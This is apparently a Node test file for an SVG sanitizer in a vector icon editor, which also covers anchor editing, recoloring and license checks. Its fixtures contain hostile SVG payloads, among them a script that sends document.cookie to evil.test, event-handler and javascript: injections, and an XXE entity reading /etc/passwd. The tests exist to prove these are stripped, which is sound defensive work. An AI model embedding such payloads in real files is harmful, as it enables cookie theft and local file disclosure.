import assert from "node:assert/strict";
import test from "node:test";

import {
  SVG_SANITIZE_RULES,
  SVG_DANGEROUS_CONSTRUCT_CLASSES,
  assertSvgSanitized,
  residualDangerousConstructs,
  sanitizeSvg,
} from "../src/shell/vector-editor/vector-sanitize.ts";
import {
  VECTOR_ILLEGAL_TRANSITIONS,
  insertVectorAnchor,
  loadVectorSource,
  parsePathAnchors,
  recolorVectorToken,
  removeVectorAnchor,
  renderVectorProjectToSvg,
  replaceVectorShape,
  tokenizeSvgToVectorProject,
  vectorCapabilityReport,
  vectorLicenseDecision,
  vectorLicenseManifest,
  vectorRenderDigest,
  vectorTransitionAllowed,
  assertVectorCarrierConformance,
} from "../src/shell/vector-editor/vector-source.ts";
import {
  VECTOR_CONSTANTS,
  VECTOR_LICENSE_CODES,
  VectorCarrierError,
  serializeVectorProject,
  validateVectorProject,
} from "../src/shell/vector-editor/vector-schema.ts";

const encoder = new TextEncoder();
const byteSize = (text) => encoder.encode(text).byteLength;

/**
 * 自证样例 1:把 §3.2 八条规则全部踩一遍的敌意 SVG。它同时带四个真实图形,
 * 所以「剥干净」与「仍渲得出」两件事必须在同一份输入上同时成立。
 */
const HOSTILE_SVG = `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="alert(1)">
  <title>hostile icon</title>
  <script>alert('pwned')</script>
  <style>@import url("https://evil.test/x.css"); .a { fill: #1F2328; }</style>
  <foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject>
  <a href="javascript:alert(2)"><rect x="2" y="2" width="8" height="8" fill="#1F2328"/></a>
  <image href="https://evil.test/tracker.png" x="0" y="0" width="4" height="4"/>
  <use href="https://evil.test/sprite.svg#icon"/>
  <path d="M3 3 L21 3 L21 21 L3 21 Z" stroke="#1F2328" fill="none" onclick="steal()"/>
  <circle cx="12" cy="12" r="5" stroke="#1F2328" fill="none"/>
</svg>`;

/**
 * 自证样例 2:一份干净的 24 栅格图标,四个独立图形、单一墨色。它是 §5.1 三件
 * 能力与 §8 完备判据的正面样例,走完 empty → … → ready。
 */
const CLEAN_ICON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
  <title>folder open</title>
  <path d="M2 6 L9 6 L11 9 L22 9 L22 19 L2 19 Z" fill="none" stroke="#1F2328" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M4 12 L20 12" fill="none" stroke="#1F2328" stroke-width="2" stroke-linecap="round"/>
  <circle cx="17" cy="15" r="2" fill="none" stroke="#1F2328" stroke-width="2"/>
  <rect x="5" y="14" width="6" height="3" rx="1" fill="none" stroke="#1F2328" stroke-width="2"/>
</svg>`;

/**
 * 自证样例 3:233 B 级空壳。语法合法、净化后无残留,但没有可编辑的图形层级,
 * §8 必须判它不合格 —— 这是合同 §2.8 点名的那类产物。
 */
const HOLLOW_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0" fill="none"/><rect x="0" y="0" width="1" height="1" fill="none"/></svg>`;

const ICON_TOKENIZE = {
  title: "文件夹展开图标 v1",
  kind: "icon",
  accessibility: { label: "folder open", decorative: false },
  attribution: [
    {
      text: "tabler icons",
      licenseCode: "MIT",
      licenseUrl: "https://opensource.org/license/mit",
      provider: "tabler",
    },
  ],
};

function loadCleanIcon() {
  return loadVectorSource({
    svg: CLEAN_ICON_SVG,
    tokenize: ICON_TOKENIZE,
    frameColorCount: 5,
  });
}

// ---------------------------------------------------------------------------
// §3.2 净化规则逐条 —— 安全面
// ---------------------------------------------------------------------------

test("§3.2 八条规则在契约里逐条登记,C28 危险构造类目数与之一致", () => {
  assert.deepEqual(
    SVG_SANITIZE_RULES.map((rule) => rule.id),
    [
      "script-element",
      "event-attribute",
      "foreign-object",
      "external-href",
      "dangerous-scheme",
      "external-image",
      "style-import",
      "external-entity",
    ],
  );
  assert.equal(SVG_DANGEROUS_CONSTRUCT_CLASSES, 8);
  assert.equal(
    SVG_DANGEROUS_CONSTRUCT_CLASSES,
    VECTOR_CONSTANTS.C28_dangerousConstructClasses,
  );
  for (const rule of SVG_SANITIZE_RULES) {
    assert.match(rule.spec, /§3\.2/);
    assert.match(rule.disposition, /^MUST /);
  }
});

/**
 * 每条规则一个最小敌意样例。每例都额外带一个真图形,用来确认净化器剥的是危险
 * 构造而不是把整份 SVG 铲平。
 */
const RULE_CASES = [
  {
    rule: "script-element",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><script>fetch('https://evil.test?c='+document.cookie)</script><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["<script", "document.cookie"],
  },
  {
    rule: "event-attribute",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="alert(1)"><path d="M2 2 L20 20" stroke="#1F2328" onclick="alert(2)" onmouseover="alert(3)"/></svg>`,
    gone: ["onload", "onclick", "onmouseover"],
  },
  {
    rule: "foreign-object",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><foreignObject width="9" height="9"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://evil.test"></iframe></body></foreignObject><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["foreignObject", "iframe"],
  },
  {
    rule: "external-href",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><use href="https://evil.test/sprite.svg#icon"/><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["evil.test"],
  },
  {
    rule: "dangerous-scheme",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><a href="javascript:alert(1)"><path d="M2 2 L20 20" stroke="#1F2328"/></a></svg>`,
    gone: ["javascript:"],
  },
  {
    rule: "external-image",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><image href="https://evil.test/tracker.png" width="4" height="4"/><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["evil.test", "<image"],
  },
  {
    rule: "style-import",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><style>@import url("https://evil.test/x.css"); .a { fill: #1F2328; }</style><path class="a" d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["@import", "evil.test"],
  },
  {
    rule: "external-entity",
    svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`,
    gone: ["<!DOCTYPE", "ENTITY", "file:///etc/passwd"],
  },
];

for (const testCase of RULE_CASES) {
  test(`§3.2 ${testCase.rule}:剥离危险构造且不铲平图形`, () => {
    const report = sanitizeSvg(testCase.svg);
    assert.ok(
      report.removals.some((removal) => removal.rule === testCase.rule),
      `期望命中 ${testCase.rule},实际 ${JSON.stringify(report.removals.map((r) => r.rule))}`,
    );
    for (const needle of testCase.gone) {
      assert.equal(
        report.svg.includes(needle),
        false,
        `净化后仍残留 ${needle}`,
      );
    }
    assert.deepEqual(report.residual, []);
    // 「净化后必须仍可渲染」:不能净化成空白。
    assert.equal(report.renderable, true);
    assert.ok(report.graphicElementCount >= 1);
    assert.equal(report.hasViewBox, true);
    assert.ok(report.svg.includes("<path"));
  });
}

test("§3.2 八条规则在同一份敌意 SVG 上一次全中,残留为 0 且仍可渲染", () => {
  const report = sanitizeSvg(HOSTILE_SVG);
  const hit = new Set(report.removals.map((removal) => removal.rule));
  for (const rule of SVG_SANITIZE_RULES) {
    assert.ok(hit.has(rule.id), `${rule.id} 未被命中`);
  }
  assert.deepEqual(report.residual, []);
  assert.equal(report.renderable, true);
  // 四个真图形(rect / path / circle 及 <a> 内容)一个都不能丢。
  assert.ok(report.graphicElementCount >= 3);
  assert.ok(report.svg.includes('<rect x="2" y="2"'));
  assert.ok(report.svg.includes('<circle cx="12" cy="12"'));
  assert.ok(report.svg.includes('d="M3 3 L21 3 L21 21 L3 21 Z"'));
  // 样式表里那条无害规则要留着,被剥的只有 @import。
  assert.ok(report.svg.includes(".a { fill: #1F2328; }"));
  for (const needle of [
    "<script",
    "onload",
    "onclick",
    "javascript:",
    "foreignObject",
    "evil.test",
    "@import",
    "<!DOCTYPE",
  ]) {
    assert.equal(report.svg.includes(needle), false, `残留 ${needle}`);
  }
});

test("§3.2 净化是纯函数:同输入同输出、幂等、不改动入参", () => {
  const input = String(HOSTILE_SVG);
  const first = sanitizeSvg(input);
  const second = sanitizeSvg(input);
  assert.equal(first.svg, second.svg, "同输入必须逐字节同输出");
  assert.deepEqual(
    first.removals.map((removal) => `${removal.rule}|${removal.target}`),
    second.removals.map((removal) => `${removal.rule}|${removal.target}`),
  );
  assert.equal(input, HOSTILE_SVG, "入参字符串不得被改写");

  const third = sanitizeSvg(first.svg);
  assert.equal(third.svg, first.svg, "二次净化必须是恒等");
  assert.deepEqual(third.removals, [], "干净输入不应再产生移除项");
});

test("§3.2 内部引用与无害内容不被误杀", () => {
  const internal = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs><symbol id="dot"><circle cx="2" cy="2" r="2"/></symbol></defs><use href="#dot"/><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`;
  const report = sanitizeSvg(internal);
  assert.deepEqual(report.removals, []);
  assert.ok(report.svg.includes('href="#dot"'));
  assert.ok(report.svg.includes("<symbol"));
  assert.equal(report.renderable, true);
});

test("§3.2 残留探测走解析器,不被大小写与标签边界糊弄;干净文本不误报", () => {
  assert.deepEqual(residualDangerousConstructs(sanitizeSvg(HOSTILE_SVG).svg), []);
  assert.deepEqual(residualDangerousConstructs(CLEAN_ICON_SVG), []);

  const mixedCase = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><ScRiPt>alert(1)</ScRiPt><path d="M2 2 L20 20" OnClick="alert(2)"/></svg>`;
  const residual = residualDangerousConstructs(mixedCase);
  assert.ok(residual.includes("script-element"));
  assert.ok(residual.includes("event-attribute"));

  // 文本节点里写着 "script" 只是内容,不构成危险构造。
  const textOnly = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><text x="1" y="9">script onclick javascript</text><path d="M2 2 L20 20" stroke="#1F2328"/></svg>`;
  assert.deepEqual(residualDangerousConstructs(textOnly), []);
});

test("§3.2 assertSvgSanitized 对未净化文本抛错,对净化产物放行", () => {
  assert.throws(() => assertSvgSanitized(HOSTILE_SVG), VectorCarrierError);
  assert.doesNotThrow(() => assertSvgSanitized(sanitizeSvg(HOSTILE_SVG).svg));
});

test("§3.3 tokenizer 拒绝未净化的 SVG(parsed → tokenized 是非法边)", () => {
  assert.throws(
    () => tokenizeSvgToVectorProject(HOSTILE_SVG, ICON_TOKENIZE),
    (error) =>
      error instanceof VectorCarrierError &&
      error.code === "vector-script-residue",
  );
});

// ---------------------------------------------------------------------------
// §3.3 状态机
// ---------------------------------------------------------------------------

test("§3.3 五条非法迁移一条都不放行,净化后的敌意 SVG 走完合法路径", () => {
  assert.equal(VECTOR_ILLEGAL_TRANSITIONS.length, 5);
  for (const illegal of VECTOR_ILLEGAL_TRANSITIONS) {
    assert.equal(
      vectorTransitionAllowed(illegal.from, illegal.to),
      false,
      `${illegal.from} → ${illegal.to} 不应被允许`,
    );
  }
  assert.equal(vectorTransitionAllowed("parsed", "sanitized"), true);
  assert.equal(vectorTransitionAllowed("sanitized", "tokenized"), true);

  const loaded = loadVectorSource({
    svg: HOSTILE_SVG,
    tokenize: { ...ICON_TOKENIZE, title: "敌意图标净化自证 v1" },
    frameColorCount: 6,
  });
  assert.equal(loaded.trace[0], "empty");
  assert.ok(loaded.trace.includes("sanitized"));
  assert.equal(
    loaded.trace.includes("tokenized") &&
      loaded.trace.indexOf("sanitized") < loaded.trace.indexOf("tokenized"),
    loaded.trace.includes("tokenized"),
  );
  for (let index = 1; index < loaded.trace.length; index += 1) {
    assert.equal(
      vectorTransitionAllowed(loaded.trace[index - 1], loaded.trace[index]),
      true,
      `轨迹里出现非法边 ${loaded.trace[index - 1]} → ${loaded.trace[index]}`,
    );
  }
});

test("§3.3 干净图标走满 empty → parsed → sanitized → tokenized → ready", () => {
  const loaded = loadCleanIcon();
  assert.deepEqual(loaded.trace, [
    "empty",
    "parsed",
    "sanitized",
    "tokenized",
    "ready",
  ]);
  assert.equal(loaded.state, "ready");
  assert.equal(loaded.code, null);
  assert.ok(loaded.project);
});

// ---------------------------------------------------------------------------
// §5.1 R1 三件「拿不到的能力」
// ---------------------------------------------------------------------------

test("§5.1 能力一 · 改锚点:插入与删除锚点都落到 path 数据上", () => {
  const project = loadCleanIcon().project;
  const target = project.shapes[0];
  assert.equal(target.type, "path");
  assert.equal(target.anchorCount, 6);

  // 插入语义是「在第 index 个锚点之后」,所以新锚点落在 index 2。
  const inserted = insertVectorAnchor(project, target.id, 1, { x: 15, y: 7 });
  assert.equal(inserted.shapes[0].anchorCount, 7);
  assert.ok(inserted.shapes[0].d.includes("L 15 7"));
  assert.notEqual(
    vectorRenderDigest(inserted),
    vectorRenderDigest(project),
    "锚点变了渲染摘要必须变",
  );

  const removed = removeVectorAnchor(inserted, target.id, 2);
  assert.equal(removed.shapes[0].anchorCount, 6);
  assert.equal(removed.shapes[0].d.includes("L 15 7"), false);
  // `d` 会被重排成规范写法,所以比几何而不是比字符串。
  assert.deepEqual(
    parsePathAnchors(removed.shapes[0].d).map((a) => [a.x, a.y]),
    parsePathAnchors(target.d).map((a) => [a.x, a.y]),
    "插入再删除同一锚点必须回到原来的锚点序列",
  );

  // 纯函数:原 project 不被就地改写。
  assert.equal(project.shapes[0].anchorCount, 6);
  assert.equal(project.shapes[0].d, target.d);

  const capability = vectorCapabilityReport(project);
  assert.equal(capability.anchorEditing.ok, true);
  assert.ok(
    capability.anchorEditing.totalAnchors >=
      VECTOR_CONSTANTS.C22_minimumTotalAnchors,
  );
});

test("§5.1 能力二 · 改配色:调色板 token 一改,引用它的图形全部联动", () => {
  const project = loadCleanIcon().project;
  const before = vectorRenderDigest(project);
  const recolored = recolorVectorToken(project, "vec-ink", "#1F6FEB");

  assert.equal(recolored.changedShapeIds.length, project.shapes.length);
  assert.notEqual(vectorRenderDigest(recolored.project), before);
  const token = recolored.project.palette.find(
    (entry) => entry.token === "vec-ink",
  );
  assert.equal(token.value, "#1F6FEB");
  assert.ok(renderVectorProjectToSvg(recolored.project).includes("#1F6FEB"));
  // 原件不变:改色是纯函数。
  assert.equal(vectorRenderDigest(project), before);

  const capability = vectorCapabilityReport(project);
  assert.equal(capability.recoloring.ok, true);
  assert.deepEqual(capability.recoloring.hardcodedShapeIds, []);
  assert.equal(capability.recoloring.tokenReferenceRatio, 1);
});

test("§5.1 能力三 · 换形状:替换单个图形,其它图形逐字节不动", () => {
  const project = loadCleanIcon().project;
  const victim = project.shapes[2];
  assert.equal(victim.type, "circle");

  const swapped = replaceVectorShape(project, victim.id, {
    type: "rect",
    x: 15,
    y: 13,
    width: 4,
    height: 4,
    strokeToken: "vec-ink",
  });
  assert.equal(swapped.shapes.length, project.shapes.length);
  assert.equal(swapped.shapes[2].type, "rect");
  for (const index of [0, 1, 3]) {
    assert.deepEqual(
      swapped.shapes[index],
      project.shapes[index],
      "未被替换的图形不得受影响",
    );
  }
  assert.notEqual(vectorRenderDigest(swapped), vectorRenderDigest(project));
  assert.equal(validateVectorProject(swapped).ok, true);

  const capability = vectorCapabilityReport(project);
  assert.equal(capability.shapeSwapping.ok, true);
  assert.equal(capability.shapeSwapping.independentlySelectable, true);
  assert.ok(
    capability.shapeSwapping.shapeCount >=
      VECTOR_CONSTANTS.C3_minimumIconShapes,
  );
  assert.equal(capability.flattened, false);
  assert.equal(capability.ok, true);
});

test("§5.1 压平成单 path 的矢量三件能力不成立,停在 flattened-only", () => {
  const flattened = loadVectorSource({
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M1 1 L23 1 L23 23 Z" fill="#1F2328"/></svg>`,
    tokenize: { ...ICON_TOKENIZE, title: "压平单路径样例 v1" },
    frameColorCount: 4,
  });
  assert.equal(flattened.state, "flattened-only");
  assert.equal(flattened.code, "vector-flattened-only");
  assert.equal(flattened.trace.includes("ready"), false);
  assert.equal(vectorTransitionAllowed("flattened-only", "ready"), false);
});

// ---------------------------------------------------------------------------
// §1.3 许可分层
// ---------------------------------------------------------------------------

test("§1.3 许可分层落在产物元数据里,CC-BY-SA 一律禁入", () => {
  const openmoji = vectorLicenseDecision({
    provider: "openmoji",
    licenseCode: "CC-BY-SA",
  });
  assert.equal(openmoji.tier, "forbidden");
  assert.equal(openmoji.standaloneDownloadAllowed, false);

  const svgrepo = vectorLicenseDecision({
    provider: "svgrepo",
    licenseCode: "PDM",
  });
  assert.equal(svgrepo.tier, "composite-component-only");
  assert.equal(svgrepo.standaloneDownloadAllowed, false);

  const permissive = vectorLicenseDecision({
    provider: "tabler",
    licenseCode: "MIT",
  });
  assert.equal(permissive.standaloneDownloadAllowed, true);
  assert.equal(permissive.attributionRequired, true);

  const project = loadCleanIcon().project;
  const manifest = vectorLicenseManifest(project);
  assert.equal(manifest.ok, true);
  assert.deepEqual(manifest.forbidden, []);
  assert.equal(manifest.standaloneDownloadAllowed, true);
  assert.equal(manifest.entries[0].decision.tier, permissive.tier);
  // 署名必须在渲染产物里可见,不能只躺在 IR 里。
  const rendered = renderVectorProjectToSvg(project);
  assert.ok(rendered.includes("<metadata>"));
  assert.ok(rendered.includes("MIT"));
  assert.ok(rendered.includes("tabler icons"));
});

test("§1.3 CC-BY-SA 被两层挡住:schema 枚举里没有它,许可清单也判 forbidden", () => {
  // 第一层:§3.1 的 licenseCode 枚举本身就不收 CC-BY-SA。
  assert.equal(VECTOR_LICENSE_CODES.includes("CC-BY-SA"), false);
  const project = loadCleanIcon().project;
  const smuggled = {
    ...project,
    attribution: {
      entries: [
        {
          text: "openmoji",
          licenseCode: "CC-BY-SA",
          licenseUrl: "https://creativecommons.org/licenses/by-sa/4.0/",
          provider: "openmoji",
        },
      ],
    },
  };
  const validation = validateVectorProject(smuggled);
  assert.equal(validation.ok, false);
  assert.ok(
    validation.errors.some((error) => error.keyword === "enum"),
    `期望 enum 违例,实际 ${JSON.stringify(validation.errors)}`,
  );

  // 第二层:即便绕过 schema,许可清单仍判 forbidden 且不许单件下载。
  const manifest = vectorLicenseManifest(smuggled);
  assert.equal(manifest.ok, false);
  assert.equal(manifest.standaloneDownloadAllowed, false);
  assert.ok(manifest.forbidden.includes("openmoji"));
  assert.equal(
    VECTOR_CONSTANTS.C45_openmojiCcBySaForbidden,
    1_644,
    "§1.3 点名被排除的 openmoji 件数",
  );
});

// ---------------------------------------------------------------------------
// §8 字节下限与完备判据
// ---------------------------------------------------------------------------

test("§8 233 B 级空壳:语法合法、无残留,但判不合格", () => {
  assert.ok(byteSize(HOLLOW_SVG) < 512, "样例本身要够小才算空壳");
  assert.deepEqual(sanitizeSvg(HOLLOW_SVG).residual, [], "空壳并非脏源");

  const loaded = loadVectorSource({
    svg: HOLLOW_SVG,
    tokenize: { ...ICON_TOKENIZE, title: "空壳样例 233B v1" },
    frameColorCount: 4,
  });
  assert.notEqual(loaded.state, "ready");
  assert.equal(loaded.trace.includes("ready"), false);
  assert.ok(loaded.reason.length > 0);
});

test("§8 干净图标满足全部完备判据,§9 C-2/C-3/C-4/C-7/C-9 逐条为真", () => {
  const loaded = loadCleanIcon();
  const project = loaded.project;
  const sanitized = sanitizeSvg(CLEAN_ICON_SVG).svg;

  assert.deepEqual(loaded.completeness.failed, []);
  assert.equal(loaded.completeness.ok, true);
  assert.ok(byteSize(sanitized) >= VECTOR_CONSTANTS.C29_iconSourceByteFloor);
  assert.ok(
    byteSize(serializeVectorProject(project)) >=
      VECTOR_CONSTANTS.C32_irByteFloor,
  );

  const conformance = assertVectorCarrierConformance({
    svg: sanitized,
    project,
    frameColorCount: 5,
  });
  assert.equal(conformance.ok, true);
  const byId = new Map(conformance.checks.map((check) => [check.id, check]));
  for (const id of ["C-2", "C-3", "C-4", "C-7", "C-9"]) {
    assert.equal(byId.get(id)?.ok, true, `${id} 未通过:${byId.get(id)?.detail}`);
  }
});

test("§3.1 IR 通过 schema 校验,序列化是确定性的", () => {
  const project = loadCleanIcon().project;
  assert.equal(validateVectorProject(project).ok, true);
  assert.equal(
    serializeVectorProject(project),
    serializeVectorProject(loadCleanIcon().project),
    "同一输入两次载入必须序列化成同一字节串",
  );
  assert.equal(project.schema, "oceanleo.vector.v1");
});
